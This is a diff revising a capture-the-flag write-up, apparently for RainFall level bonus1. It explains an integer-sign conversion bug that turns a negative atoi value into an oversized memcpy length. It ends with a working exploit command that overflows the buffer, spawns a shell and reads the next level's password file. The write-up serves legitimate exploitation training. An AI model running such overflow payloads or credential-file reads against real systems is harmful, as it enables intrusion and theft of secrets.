@@ -59,9 +59,9 @@ Non-debugging symbols:
 0x0804855c  _fini
 ```
 
-No other functions are called by the binary.
+No user-defined functions are called by the binary.
 
-And the variables ?
+And what about the variables ?
 
 ```gdb
 gdb-peda$ info variables
@@ -88,8 +88,7 @@ Non-debugging symbols:
 0x08049790  dtor_idx.6161
 ```
 
-Neither.
-
+There are no user-defined global variables neither.
 
 Ok let's look at `main`
 
@@ -122,7 +121,7 @@ Dump of assembler code for function main:
    0x08048470 <+76>:	mov    DWORD PTR [esp],eax                <-- set 1st argument to buffer
    0x08048473 <+79>:	call   0x8048320 <memcpy@plt>             <-- call memcpy(buffer, argv[2], i)
    0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46    <-- compare i with '1464814662'
-   0x08048480 <+92>:	jne    0x804849e <main+122>               <-- if i != '1464814662', jump to main+122
+   0x08048480 <+92>:	jne    0x804849e <main+122>               <-- if i != '1464814662', jump to main+122 (return(0))
    0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0            <-- set 3rd argument to 0
    0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580   <-- set 2nd argument to "sh"
    0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583       <-- set 1st argument to "/bin/sh"
@@ -133,37 +132,51 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-## How to exploit ?
+## Identifying the vulnerability 
 
-Everythings looks like to happen in the `main` function.
+We clearly can see that the `main` function is calling `execl` with the `/bin/sh` and `sh` arguments.
 
-Ok, se we clearly can see that the `main` function is calling `execl` with the `/bin/sh` and `sh` arguments.
+But how can we get there ?
 
-But how can we get there.
+### First step 
 
-Our first argument to this binary is passed to `i = atoi(argv[1])`. Then if our first argument is at most equal to `9`. We can go further.
+Our first argument to this binary is passed to `i = atoi(argv[1])`.
 
-After this check, our value is multiplied by `4`.
+Then if our first argument is at most equal to `9`.
 
-So `i` become `i * 4`.
+We can go further.
 
-Then we have `memcpy(buffer, argv[2], i)`. We pass our second argument to the binary and it is copied bytes per bytes to the `buffer`.
+### Second step
+
+Then the value returned by `atoi()` is multiplied by `4`.
+
+So `i` becomes `i * 4`.
+
+Then we have `memcpy(buffer, argv[2], i)`.
+
+We pass our second argument to the binary and it is copied byte after byte to the `buffer`.
 
 The `buffer` can hold at most `40` bytes.
 
-We cleary have a buffer overflow potential here. But from a simple mathematical analysis it is not possible.
+We cleary have a buffer overflow potential here. 
 
-In deed, to get a buffer overflow, we have to pass more than `40` bytes to the `memcpy()` function. But to get there we can at most give: `9 * 4` = `36 bytes` to `memcpy()`.
+But from a simple mathematical standpoint, it is not possible.
 
-After a bit digging we can see that a integer conversion occurs there. We receive a signed integer from the `atoi()` function. But we pass a unsigned integer to memcpy().
+Indeed, to get a buffer overflow, we have to pass more than `40` bytes to the `memcpy()` function.
 
-So we must ensure to have a correct value for the `i` variable as a signed integer to by pass the first check and trigger a buffer overflow.
+But to get there we can at most give: `9 * 4` = `36 bytes` to `memcpy()`.
 
-## Exploit
+After a bit digging we can see that a integer conversion occurs there.
 
-Since the integer is at the higher memory address than the buffer, we can easily overflow this address and pass the condition for i = 1464814662.
+We receive a signed integer from the `atoi()` function, but we pass a unsigned integer to `memcpy()`.
 
-So technichaly we need more than 40 bytes to overflow the buffer and be abble to overwrite the integer.
+So we must ensure to have a correct value for the `i` variable as a signed integer and pass the first check and still trigger a buffer overflow.
+
+## Overflowing the buffer 
+
+Since the integer is at the higher memory address than the buffer, we can easily overflow this address and bypass the condition for i = 1464814662.
+
+So technically we need more than 40 bytes to overflow the buffer and be able to overwrite the integer.
 
 But how can we pass a positive value to memcpy with a negative integer as input ?
 
@@ -173,11 +186,13 @@ Let's divide by `4` to get the integer.
 
 `4294967296 / 4 = 1073741824`. If we multiple `(unsigned int)(-1073741824 * 4)` we have 0.
 
-We then have our a negative integer that pass the crash we can now find our next segfault deeper in the executable. We will find wich value is causing a buffer overflow with `memcpy` now.
+We then have a negative integer that passes the crash we can now find our next segfault deeper in the executable.
+
+We will find which value is causing a buffer overflow with `memcpy` now.
+
 Let's find the segfault from there.
 
-
-```
+```gdb
 (unsigned int)(-1073741824 * 4) = 4.
 (unsigned int)(-1073741823 * 4) = 8.
 (unsigned int)(-1073741822 * 4) = 12.
@@ -196,14 +211,18 @@ Let's find the segfault from there.
 (unsigned int)(-1073741809 * 4) = 64.  <-- segfault !
 ```
 
-```
+```shell-session
 bonus1@RainFall:~$ ./bonus1 -1073741809
 Segmentation fault (core dumped)
 ```
 
-We can now overwrite the integer with an exact value and a padding of 40 bytes. No need shell code we know exactly where the integer is located. The rest will follow.
+We can now overwrite the integer with an exact value and a padding of 40 bytes.
 
-```
+## Exploit
+
+No need shell code we know exactly where the integer is located. The rest will follow.
+
+```shell-session
 bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c "print '\x90' * 40 + '\x46\x4c\x4f\x57'")
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
